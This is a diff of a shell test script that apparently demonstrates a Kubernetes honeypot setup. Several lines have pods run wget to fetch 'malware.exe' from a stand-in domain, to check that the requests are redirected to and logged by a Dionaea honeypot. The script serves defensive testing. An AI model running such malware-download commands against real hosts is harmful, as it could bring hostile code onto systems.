@@ -168,18 +168,13 @@ sleep 3
 
 msg "Every wget request to gqoppwnan.com is forwarded to honeypot"
 kubectl exec -it "$MALICE_POD" -- wget gqoppwnan.com/malware.exe && true
-sleep 3
-
-msg "All pods wget requests to gqoppwnan.com should be forwarded to honeypot"
+sleep 3 
 kubectl exec -it "$ALICE_POD_1" -- wget gqoppwnan.com/malware.exe && true
-sleep 3
-
-kubectl exec -it "$ALICE_POD_2" -- wget gqoppwnan.com/malware.exe && true
-sleep 3
+sleep 5
 
 msg "All wget requests to gqoppwnan.com should be logged to honeypot"
-kubectl exec -it $HONEYPOT_POD -- bash -c "cat dionaea/var/log/dionaea/dionaea.log | grep attackid"  
-sleep 5
+kubectl exec -it $HONEYPOT_POD -- bash -c "cat dionaea/var/log/dionaea/dionaea.log | grep 'http.py:15'"  
+sleep 5 
 
 echo -e "\n\n"
 
